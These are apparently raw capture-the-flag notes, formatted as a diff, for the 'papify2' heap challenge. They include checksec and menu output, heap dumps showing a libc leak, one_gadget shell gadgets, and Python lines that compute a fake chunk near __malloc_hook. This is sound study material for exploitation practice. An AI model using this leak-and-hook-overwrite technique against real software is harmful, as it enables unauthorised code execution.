@@ -1,0 +1,115 @@
+root@kali:~/h-c0n/papify2# file chall
+chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1e551576dc15f52434e0cec761e25e5cb1e63120, for GNU/Linux 3.2.0, stripped
+root@kali:~/h-c0n/papify2# checksec chall
+[*] '/root/h-c0n/papify2/chall'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+root@kali:~/h-c0n/papify2# ./chall
+
+ /$$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$$ /$$     /$$
+| $$__  $$ /$$__  $$| $$__  $$|_  $$_/| $$_____/|  $$   /$$/
+| $$  \ $$| $$  \ $$| $$  \ $$  | $$  | $$       \  $$ /$$/
+| $$$$$$$/| $$$$$$$$| $$$$$$$/  | $$  | $$$$$     \  $$$$/
+| $$____/ | $$__  $$| $$____/   | $$  | $$__/      \  $$/
+| $$      | $$  | $$| $$        | $$  | $$          | $$
+| $$      | $$  | $$| $$       /$$$$$$| $$          | $$
+|__/      |__/  |__/|__/      |______/|__/          |__/
+
+Developed by Hackplayers. Version: FIXED (h-c0n quals 2020)
+
+Select an option:
+
+        1. Add a paper
+        2. Fix a typo
+        3. Delete a paper
+        4. Print a paper
+        0. Exit
+
+>>
+
+
+0x55b25c4b5640: 0x4141414141414141      0x4141414141414141 <- "AAAAAAAAAAA"
+0x55b25c4b5650: 0x0000000000000000      0x0000000000000091
+0x55b25c4b5660: 0x00007f45e72daca0      0x00007f45e72daca0 <- leak
+0x55b25c4b5670: 0x4242424242424242      0x4242424242424242 <- "BBBBBBBBBBB"
+
+0x7f45e72dac90 <main_arena+80>: 0x0000000000000000      0x0000000000000000
+0x7f45e72daca0 <main_arena+96>: 0x000055b25c4b5770      0x0000000000000000 <- our leaked direction
+0x7f45e72dacb0 <main_arena+112>:0x000055b25c4b5650      0x000055b25c4b5650
+
+
+0x55f7e5d47650: 0x0000000000000000      0x0000000000000021
+0x55f7e5d47660: 0x4141414141414141      0x4141414141414141
+0x55f7e5d47670: 0x4141414141414141      0x0000000000000091
+0x55f7e5d47680: 0x00007f695a510ca0      0x00007f695a510ca0
+0x55f7e5d47690: 0x4242424242424242      0x4242424242424242
+0x55f7e5d476a0: 0x4242424242424242      0x4242424242424242
+0x55f7e5d476b0: 0x4242424242424242      0x4242424242424242
+0x55f7e5d476c0: 0x4242424242424242      0x4242424242424242
+0x55f7e5d476d0: 0x4242424242424242      0x4242424242424242
+0x55f7e5d476e0: 0x4242424242424242      0x4242424242424242
+0x55f7e5d476f0: 0x4242424242424242      0x4242424242424242
+0x55f7e5d47700: 0x0000000000000090      0x0000000000000020
+0x55f7e5d47710: 0x4343434343434343      0x4343434343434343
+0x55f7e5d47720: 0x4343434343434343      0x000000000001f8e1
+0x55f7e5d47730: 0x0000000000000000      0x0000000000000000
+
+0x56538a57d650: 0x0000000000000000      0x0000000000000021
+0x56538a57d660: 0x4141414141414141      0x4141414141414141
+0x56538a57d670: 0x4141414141414141      0x0000000000000093
+0x56538a57d680: 0x0a64646464646464      0x00007f05169a4c0a
+0x56538a57d690: 0x4242424242424242      0x4242424242424242
+0x56538a57d6a0: 0x4242424242424242      0x4242424242424242
+0x56538a57d6b0: 0x4242424242424242      0x4242424242424242
+0x56538a57d6c0: 0x4242424242424242      0x4242424242424242
+0x56538a57d6d0: 0x4242424242424242      0x4242424242424242
+0x56538a57d6e0: 0x4242424242424242      0x4242424242424242
+0x56538a57d6f0: 0x4242424242424242      0x4242424242424242
+0x56538a57d700: 0x0000000000000090      0x0000000000000021
+0x56538a57d710: 0x4343434343434343      0x4343434343434343
+0x56538a57d720: 0x4343434343434343      0x000000000001f8e1
+0x56538a57d730: 0x0000000000000000      0x0000000000000000
+s
+
+root@kali:/media/sf_hckon/papify2/share# one_gadget libc-cont.so
+0xe237f execve("/bin/sh", rcx, [rbp-0x70])
+constraints:
+  [rcx] == NULL || rcx == NULL
+  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
+
+0xe2383 execve("/bin/sh", rcx, rdx)
+constraints:
+  [rcx] == NULL || rcx == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe2386 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+0x106ef8 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+0x7f0748abcbe0 <_IO_wide_data_0+256>:   0x0000000000000000      0x0000000000000000
+0x7f0748abcbf0 <_IO_wide_data_0+272>:   0x0000000000000000      0x0000000000000000
+0x7f0748abcc00 <_IO_wide_data_0+288>:   0x0000000000000000      0x0000000000000000
+0x7f0748abcc10 <_IO_wide_data_0+304>:   0x00007f0748abe020      0x0000000000000000
+0x7f0748abcc20 <__memalign_hook>:       0x00007f0748989e20      0x00007f074898a4e0
+0x7f0748abcc30 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
+0x7f0748abcc40 <main_arena>:    0x0000000000000000      0x0000000000000001
+
+0x7f0748abcbed <_IO_wide_data_0+269>:   0x0000000000000000      0x0000000000000000
+0x7f0748abcbfd <_IO_wide_data_0+285>:   0x0000000000000000      0x0000000000000000
+0x7f0748abcc0d <_IO_wide_data_0+301>:   0x0748abe020000000      0x000000000000007f
+0x7f0748abcc1d: 0x0748989e20000000      0x074898a4e000007f
+0x7f0748abcc2d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
+0x7f0748abcc3d: 0x0000000000000000      0x0000000001000000
+0x7f0748abcc4d <main_arena+13>: 0x0000000000000000      0x0000000000000000
+
+fakeChunk = libcDir + elf.symbols['__malloc_hook'] - 0x23
+libcDir = u64(leak) - libc.sym['main_arena'] - 96
